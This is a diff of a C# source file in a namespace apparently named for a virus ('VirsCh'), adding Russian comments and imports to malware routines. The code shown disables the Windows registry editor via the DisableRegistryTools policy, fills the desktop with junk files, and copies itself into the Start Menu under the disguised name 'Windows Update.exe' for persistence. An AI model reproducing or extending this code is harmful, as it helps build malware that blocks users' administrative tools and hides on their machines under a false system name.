@@ -1,12 +1,16 @@
-﻿using Microsoft.Win32;
+﻿using Microsoft.VisualBasic;
+using Microsoft.Win32;
 using System;
 using System.Diagnostics;
 using System.IO;
+using System.Threading;
+using System.Windows.Forms;
 
 namespace VirsCh
 {
     class Addition
     {
+        // Работа сриетсром
         public static void RegFun()
         {
             const string quote = "\"";
@@ -29,6 +33,7 @@ namespace VirsCh
             disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
         }
 
+        // Много мусорных файлов нв робочем столе
         public static void TrashDestop()
         {
             string desktop_files = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
@@ -45,15 +50,16 @@ namespace VirsCh
             catch (Exception ex) { }
         }
 
+        // Проверка на добовление в авто запус
         public static bool IsInstalledAR()
         {
             return File.Exists($"{Environment.GetFolderPath(Environment.SpecialFolder.StartMenu)}\\Windows Update.exe");
         }
 
+        // Добовление в авто запуск
         public static void InstallAR()
         {
             File.Copy(Misc.MyLoacation(), $"{Environment.GetFolderPath(Environment.SpecialFolder.StartMenu)}\\Windows Update.exe");
         }
-
     }
 }
